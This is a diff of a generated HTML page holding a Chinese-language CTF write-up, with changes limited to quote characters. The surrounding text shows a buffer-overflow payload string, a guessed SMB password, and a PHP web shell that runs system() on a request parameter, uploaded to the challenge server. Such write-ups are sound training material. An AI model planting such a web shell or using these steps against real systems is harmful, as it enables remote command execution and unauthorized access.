@@ -235,7 +235,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TSC&#123;th1s_1s_b4by_r3v3rs3_b4by&#125;</span><br></pre></td></tr></table></figure>
 
 <h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="gamble-bad-bad"><a href="#gamble-bad-bad" class="headerlink" title="gamble_bad_bad"></a>gamble_bad_bad</h3><blockquote>
-<p>buffer 為 20 字節，jackpot_value 緊接在後麵，佔用 4 字節。<br>如果輸入超過 20 字節，超出的部分將會覆寫 jackpot_value 的內容<br>主要目標：將 jackpot_value 覆寫為 "777"</p>
+<p>buffer 為 20 字節，jackpot_value 緊接在後麵，佔用 4 字節。<br>如果輸入超過 20 字節，超出的部分將會覆寫 jackpot_value 的內容<br>主要目標：將 jackpot_value 覆寫為 “777”</p>
 </blockquote>
 <p>輸入格式：<br><code>20 字節的任意內容來填滿 buffer，再加上 &quot;777&quot; ，總共 23 字節</code></p>
 <p>舉例：<br><code>&quot;AAAAAAAAAAAAAAAAAAAA777&quot;（20 個 A，3 個 7）</code></p>
@@ -273,7 +273,7 @@
 
 <p><img src="https://hackmd.io/_uploads/BypFseUwJl.png" alt="image"><br>執行結果的尾巴就可以看到flag出現</p>
 <h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="A-BIG-BUG"><a href="#A-BIG-BUG" class="headerlink" title="A_BIG_BUG"></a>A_BIG_BUG</h3><blockquote>
-<p>題目有提示要回頭看<br>第一行有寫到連線smb的帳號ctfuser<br>密碼我是一個一個慢慢試，最後發現"pass"剛好可以過</p>
+<p>題目有提示要回頭看<br>第一行有寫到連線smb的帳號ctfuser<br>密碼我是一個一個慢慢試，最後發現“pass”剛好可以過</p>
 </blockquote>
 <p>接著開始寫php檔丟到他的upload裡面</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// filename: simple_cmd.php</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;cmd&#x27;])) &#123;</span><br><span class="line">    echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">    system($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">    echo &quot;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;Usage: ?cmd=命令&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
